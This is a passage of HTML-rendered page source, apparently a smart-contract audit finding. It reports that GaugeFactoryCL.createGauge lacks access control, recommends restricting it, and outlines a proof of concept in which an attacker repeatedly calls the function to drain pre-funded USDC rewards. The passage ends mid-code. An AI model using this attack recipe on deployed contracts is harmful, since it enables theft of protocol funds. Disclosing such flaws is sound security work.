\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_distribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_internal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_external_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                        IGaugeManager.FarmingParam \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elast_gauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ve\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_distribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_internal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_external_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e__gauges\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elast_gauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elast_gauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003eGaugeFactoryCL.createGauge\u003c/code\u003e function lacks access control, allowing any external actor to call it. This function, in turn, calls an internal \u003ccode\u003ecreateEternalFarming\u003c/code\u003e function. Below is the implementation of the \u003ccode\u003ecreateEternalFarming\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochNext\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairToDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalFarmingCustom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIt is designed to seed a new Algebra eternal farming incentive with an initial, hardcoded amount of 1e10 of the \u003ccode\u003e_rewardToken\u003c/code\u003e. It achieves this by having \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e approve the \u003ccode\u003ealgebraEternalFarming\u003c/code\u003e contract, which is then expected to pull these tokens from \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e. \u003c/p\u003e\n\u003cp\u003eIf the \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e contract is pre-funded with reward tokens to facilitate this initial seeding for legitimate gauges, an attacker can repeatedly call the \u003ccode\u003ecreateGauge\u003c/code\u003e function which will trigger the \u003ccode\u003ecreateEternalFarming\u003c/code\u003e process, causing the reward token to be transferred from \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e to a new Algebra farm associated with a pool specified by the attacker ultimately draining the reward token from the \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e contract.\u003c/p\u003e\n\u003cp\u003eThe attacker can then potentially stake a Liquidity Provider (LP) NFT into this newly created (spam) \u003ccode\u003eGaugeCL\u003c/code\u003e and its associated Algebra farm, and subsequently claim that reward.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement robust access control on the \u003ccode\u003eGaugeFactoryCL.createGauge()\u003c/code\u003e function, restricting its execution to authorized administrators or designated smart contracts, thereby preventing unauthorized calls.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eProtocol admin pre-funds \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e with \u003ccode\u003e5e10\u003c/code\u003e of USDC (50,000).\u003c/li\u003e\n\u003cli\u003eAttacker calls \u003ccode\u003eGaugeFactoryCL.createGauge()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGFCL_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateGauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eUSDC_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _rewardToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVE_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTARGET_POOL_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eATTACKER_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,   \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _distribution\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eATTACKER_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,   \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _internal_bribe\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eATTACKER_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,   \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _external_bribe\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,               \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _isPair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// including ALGEBRA_ETERNAL_FARMING_ADDRESS\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eZERO_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _bonusRewardToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eThe public \u003ccode\u003ecreateGauge\u003c/code\u003e function is entered which calls its internal \u003ccode\u003ecreateEternalFarming(_pool, farmingParam.algebraEternalFarming, USDC_ADDRESS, _bonusRewardToken)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eExecution within \u003ccode\u003eGaugeFactoryCL.createEternalFarming()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 